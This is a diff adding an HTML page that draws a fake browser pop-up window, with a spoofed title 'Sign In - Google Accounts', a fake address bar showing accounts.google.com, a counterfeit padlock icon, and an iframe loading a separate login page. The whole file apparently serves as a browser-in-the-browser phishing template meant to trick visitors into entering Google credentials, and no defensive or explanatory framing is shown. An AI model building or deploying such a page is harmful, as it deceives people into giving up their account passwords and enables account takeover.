@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" href="style.css">
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+<body>
+<div id="window">
+<!-- Title bar start -->
+<div id="title-bar-width">
+	<div id="title-bar">
+		<div style="margin-top:5px;">
+			<img src="logo.ico" width="20px" id="logo">
+			<span id="logo-description">Sign In - Google Accounts</span>
+		</div>
+
+		<div>
+			<span id="minimize">&#8212;</span>
+			<span id="square">□</span>
+			<span id="exit">✕</span>
+		</div>
+	</div>
+	<div id="url-bar">
+		<img src="./ssl.svg" width="20px" height="20px" id="ssl-padlock">
+		<span id="domain-name">https://accounts.google.com</span>
+		<span id="domain-path">/signin/v2/identifier?service=mail&passive=1209600&osid=1&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&followup=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&emr=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin</span>
+	</div>
+</div>
+<!-- Content start -->
+<iframe id="content" src="login_page.html" frameBorder="0"></iframe>
+</div>
+</body>
+<script src="script.js"></script>
+</html>
+
